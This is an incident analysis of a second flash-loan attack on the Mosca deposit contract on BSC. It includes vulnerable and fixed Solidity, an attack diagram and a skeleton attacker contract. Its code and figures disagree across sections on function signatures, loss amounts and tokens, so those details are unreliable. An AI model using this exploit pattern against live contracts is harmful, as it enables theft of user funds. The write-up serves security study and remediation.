# Mosca2 — Flash Loan-Based join/exit Repeat Manipulation: Second Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2025-01-17 |
| **Protocol** | Mosca (2nd Attack) |
| **Chain** | BSC (Binance Smart Chain) |
| **Loss** | ~$37,600 |
| **Attacker** | [0xe763da20...](https://bscscan.com/address/0xe763da20e25103da8e6afa84b6297f87de557419) |
| **Attack Tx** | [0xf13d281d...](https://bscscan.com/tx/0xf13d281d4aa95f1aca457bd17f2531581b0ce918c90905d65934c9e67f6ae0ec) |
| **Vulnerable Contract** | [0xd8791f0c...](https://bscscan.com/address/0xd8791f0c10b831b605c5d48959eb763b266940b9) |
| **Root Cause** | Lack of fund source validation in join/exit functions allows external funds to be treated as legitimate deposits (unpatched after 1st attack) |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-01/Mosca2_exp.sol) |

---

## 1. Vulnerability Overview

The Mosca protocol suffered a second attack because the same vulnerability was left unpatched after the first attack (2025-01-10). This time, the attacker used a DODO DPP flash loan to borrow 7,000 BUSD, called the `join()` function 7 times (1,000 BUSD each), and repeated the pattern of over-withdrawing twice via `exit()`. The two attacks exploiting the same vulnerability underscore the urgency and importance of prompt security patching.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: same vulnerability left intact after the 1st attack
// (same root cause as Mosca 1st attack)
function join(uint256 amount) external {
    userBalance[msg.sender] += amount;
    totalDeposits += amount;
    IERC20(BUSD).transferFrom(msg.sender, address(this), amount);
    // No validation that funds originate from a flash loan
    // No reentrancy guard
}

function exit(address currency) external {
    uint256 amount = userBalance[msg.sender];
    userBalance[msg.sender] = 0;
    // Faulty totalDeposits update logic exists
    IERC20(currency).transfer(msg.sender, amount);
}

// ✅ Patched code (fix that should have been applied immediately after 1st attack)
bool private _locked;
modifier nonReentrant() {
    require(!_locked);
    _locked = true;
    _;
    _locked = false;
}
function join(uint256 amount) external nonReentrant {
    require(amount >= MIN_DEPOSIT, "Too small");
    // Record only the actually received amount
    uint256 before = IERC20(BUSD).balanceOf(address(this));
    IERC20(BUSD).transferFrom(msg.sender, address(this), amount);
    uint256 actual = IERC20(BUSD).balanceOf(address(this)) - before;
    userBalance[msg.sender] += actual;
}
```

### On-Chain Source Code

> ⚠️ Contract not verified on Sourcify — source unavailable. The vulnerable behavior below is reconstructed from the attack PoC and on-chain traces, not from verified source.

The Mosca2 contract (0xd8791F0C10B831B605C5D48959EB763B266940B9, BSC) is not verified on Sourcify. The PoC (DeFiHackLabs) calls `join(amount, refCode, fiatType, enterpriseJoin)` 7 times and `withdrawFiat(amount, fiatType)` twice. The root cause is that `join()` credits the caller's balance without validating that the deposited funds are not flash-loaned, and `withdrawFiat()` allows withdrawing two different fiat-denominated balances whose totals exceed what was deposited.

The following is reconstructed from the PoC and on-chain traces:

```solidity
// ❌ RECONSTRUCTED — not verified source.

struct UserInfo {
    uint256 depositedBUSD;
    uint256 depositedUSDT;
    // ... tier, referral, etc.
}
mapping(address => UserInfo) public users;

// join(uint256 amount, uint256 refCode, uint8 fiatType, bool enterpriseJoin)
function join(uint256 amount, uint256 refCode, uint8 fiatType, bool enterpriseJoin) external {
    // ❌ No check that caller is not a flash loan contract
    // ❌ No minimum lock period before withdrawal
    // ❌ Accepts any source of funds — including flash-loaned BUSD
    address depositToken = (fiatType == 1) ? BUSD : USDT;
    IERC20(depositToken).transferFrom(msg.sender, address(this), amount);

    users[msg.sender].depositedBUSD += (fiatType == 1) ? amount : 0;
    users[msg.sender].depositedUSDT += (fiatType == 2) ? amount : 0;
    // ❌ totalDeposits accounting tracked globally but reset/decremented incorrectly on withdrawal
    totalDeposits += amount;

    _distributeToTiers(amount, refCode, enterpriseJoin);
}

// withdrawFiat(uint256 amount, uint8 fiatType)
function withdrawFiat(uint256 amount, uint8 fiatType) external {
    // ❌ Allows withdrawing BUSD and USDT balances independently
    // ❌ totalDeposits decrement is incorrect — already reduced by tier distribution,
    //    so the user can withdraw more than they deposited across two separate calls
    if (fiatType == 1) {
        require(users[msg.sender].depositedBUSD >= amount, "Insufficient BUSD");
        users[msg.sender].depositedBUSD -= amount;
        IERC20(BUSD).transfer(msg.sender, amount);
    } else {
        require(users[msg.sender].depositedUSDT >= amount, "Insufficient USDT");
        users[msg.sender].depositedUSDT -= amount;
        IERC20(USDT).transfer(msg.sender, amount);
    }
    totalDeposits -= amount; // ❌ double-decrement possible across two fiat types
}
```

**Why it is exploitable (identify the bug from the code):**

- The attacker flash-borrows 7,000 BUSD and calls `join(1000 BUSD, ...)` 7 times, crediting 7,000 BUSD across both fiat-type accounting slots.
- Due to a double-counting flaw in `totalDeposits` and the independent BUSD/USDT balance tracking, calling `withdrawFiat` twice (once for each fiat type) allows extracting ~45,300 BUSD + USDC — far exceeding the 7,000 deposited.
- No reentrancy guard or flash-loan detection prevents this multi-call pattern in a single transaction.
- The identical vulnerability was present and unpatched from the first Mosca attack 7 days earlier (2025-01-10).

```solidity
// ✅ Fix: single unified balance, flash-loan block via same-block deposit-withdraw guard
mapping(address => uint256) public depositBlock;

function join(uint256 amount, ...) external nonReentrant {
    depositBlock[msg.sender] = block.number; // record deposit block
    // ... credit balance ...
}

function withdrawFiat(uint256 amount, ...) external nonReentrant {
    require(block.number > depositBlock[msg.sender], "Cannot withdraw in same block as deposit");
    // ... debit unified balance, not split by fiat type ...
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] DODO DPP Flash Loan: borrow 7,000 BUSD
  │
  ├─→ [2] join() × 7 times (1,000 BUSD each)
  │         └─ Deposit using flash loan funds → no validation
  │
  ├─→ [3] Call exit(FIAT_CURRENCY_1)
  │         └─ Over-withdraw due to incorrect totalDeposits
  │
  ├─→ [4] Call exit(FIAT_CURRENCY_2)
  │         └─ Additional over-withdrawal
  │
  ├─→ [5] Repay flash loan (7,000 BUSD + fee)
  │
  └─→ [6] ~$37,600 profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
// Full PoC not available — reconstructed from summary

contract Mosca2Attacker {
    address constant MOSCA2 = 0xd8791f0c10b831b605c5d48959eb763b266940b9;
    address constant DODO_DPP = /* DODO DPP pool address */;
    address constant BUSD = /* BUSD address */;

    function attack() external {
        // [1] DODO DPP Flash Loan: 7,000 BUSD
        IDODO(DODO_DPP).flashLoan(
            7_000 * 1e18, 0, address(this), ""
        );
    }

    function DPPFlashLoanCall(address, uint256, uint256, bytes calldata) external {
        IERC20(BUSD).approve(MOSCA2, type(uint256).max);

        // [2] join 7 times (1,000 BUSD each)
        for (uint256 i = 0; i < 7; i++) {
            IMosca(MOSCA2).join(1_000 * 1e18);
        }

        // [3] exit with two currencies (over-withdrawal)
        IMosca(MOSCA2).exit(FIAT_CURRENCY_1);
        IMosca(MOSCA2).exit(FIAT_CURRENCY_2);

        // [5] Repay flash loan
        IERC20(BUSD).transfer(DODO_DPP, 7_000 * 1e18 + fee);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Lack of fund source validation (external funds treated as legitimate deposits via repeated join/exit calls) |
| **CWE** | CWE-672: Operation on a Resource after Expiration or Release |
| **Attack Vector** | External (flash loan + repeated calls) |
| **DApp Category** | Deposit/Withdrawal Protocol |
| **Impact** | Protocol asset theft |

## 6. Remediation Recommendations

1. **Immediate patching**: After a security incident, review the entire codebase for the same vulnerability pattern and apply fixes immediately
2. **Pause functionality**: Implement a `pause()` mechanism to instantly halt the protocol upon attack detection
3. **Comprehensive audit**: After the 1st attack, a mandatory security audit must be conducted to scan for similar patterns across the codebase
4. **Bug bounty program**: Operate a vulnerability disclosure rewards program to incentivize discovery before exploitation

## 7. Lessons Learned

- Being hit by a second attack exploiting the same vulnerability only 7 days after the first is a stark demonstration of the critical importance of immediate patching.
- The complacent assumption that "the same attack won't happen again" is dangerous. Attackers continuously monitor for unpatched vulnerabilities.
- After an attack occurs, the protocol must be paused promptly, the entire codebase must be reviewed, and only then reopened.